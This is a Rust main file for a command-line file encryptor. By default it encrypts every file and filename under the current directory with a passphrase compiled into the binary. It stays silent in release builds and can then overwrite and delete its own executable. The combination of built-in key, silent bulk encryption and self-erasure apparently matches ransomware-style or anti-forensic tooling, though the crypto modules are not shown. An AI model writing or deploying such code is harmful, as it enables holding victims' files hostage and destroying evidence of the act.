use std::{env, fs};
use std::path::PathBuf;
use std::fs::OpenOptions;
use std::io::{Write, Seek, SeekFrom};

mod crypto;
mod compression;
mod file_operations;

include!(concat!(env!("OUT_DIR"), "/default_settings.rs"));

fn main() {
    let args: Vec<String> = env::args().collect();

    let (mode, paths, encrypt_filenames_flag, self_destruct_flag, dir_mode) = parse_mode_paths_and_flags(&args);

    let use_custom_password = args.contains(&String::from("-p"));

    let encrypt_filenames = encrypt_filenames_flag.unwrap_or(ENCRYPT_FILENAMES);

    let encrypt = is_encrypt_mode(&mode);

    let password = get_password(use_custom_password);

    process_paths(paths, &password, encrypt, encrypt_filenames, dir_mode);

    if self_destruct_flag.unwrap_or(SELF_DESTRUCT_DEFAULT) {
        secure_self_destruct();
    }
}

fn parse_mode_paths_and_flags(args: &[String]) -> (String, Vec<PathBuf>, Option<bool>, Option<bool>, bool) {
    let mut mode = DEFAULT_MODE.to_string();
    let mut paths = Vec::new();
    let mut encrypt_filenames_flag = None;
    let mut self_destruct_flag = None;
    let mut dir_mode = false;

    for arg in args.iter().skip(1) {
        match arg.as_str() {
            "encrypt" | "decrypt" => mode = arg.clone(),
            "--encrypt-filenames" => encrypt_filenames_flag = Some(true),
            "--no-encrypt-filenames" => encrypt_filenames_flag = Some(false),
            "--self-destruct" => self_destruct_flag = Some(true),
            "--no-self-destruct" => self_destruct_flag = Some(false),
            "--dir" => dir_mode = true,
            _ if !arg.starts_with('-') => paths.push(PathBuf::from(arg)),
            _ => {}
        }
    }

    if paths.is_empty() {
        paths.push(PathBuf::from("."));
    }

    (mode, paths, encrypt_filenames_flag, self_destruct_flag, dir_mode)
}

fn is_encrypt_mode(mode: &str) -> bool {
    match mode {
        "encrypt" => true,
        "decrypt" => false,
        _ => {
            debug_print!("Invalid mode: {}. Defaulting to '{}'.", mode, DEFAULT_MODE);
            DEFAULT_MODE == "encrypt"
        }
    }
}

fn get_password(use_custom_password: bool) -> String {
    if use_custom_password {
        rpassword::prompt_password("Enter the password: ").unwrap()
    } else {
        DEFAULT_PASSPHRASE.to_string()
    }
}

fn process_paths(paths: Vec<PathBuf>, password: &str, encrypt: bool, encrypt_filenames: bool, dir_mode: bool) {
    for path in paths {
        if !path.exists() {
            debug_print!("Invalid path: {}", path.display());
            continue;
        }

        if path.is_file() {
            file_operations::process_file_with_flags(&path, password, encrypt, encrypt_filenames);
        } else if path.is_dir() {
            file_operations::process_directory_with_flags(&path, password, encrypt, encrypt_filenames, dir_mode);
        } else {
            debug_print!("Invalid path type: {}", path.display());
        }
    }
}

fn secure_self_destruct() {
    let current_exe = env::current_exe().expect("Failed to get the current executable path.");
    
    let metadata = fs::metadata(&current_exe).expect("Failed to get metadata for the current executable.");
    let file_size = metadata.len();

    let mut file = OpenOptions::new()
        .write(true)
        .open(&current_exe)
        .expect("Failed to open the current executable for writing.");

    let random_data: Vec<u8> = (0..file_size).map(|_| rand::random::<u8>()).collect();
    file.write_all(&random_data).expect("Failed to overwrite the file with random data.");

    file.seek(SeekFrom::Start(0)).expect("Failed to seek to the beginning of the file.");
    let zeros = vec![0u8; file_size as usize];
    file.write_all(&zeros).expect("Failed to overwrite the file with zeros.");
    file.sync_all().expect("Failed to sync the file to disk.");

    drop(file);
    fs::remove_file(current_exe).expect("Failed to delete the current executable.");
}

#[macro_export]
macro_rules! debug_print {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        eprintln!($($arg)*);
    }
}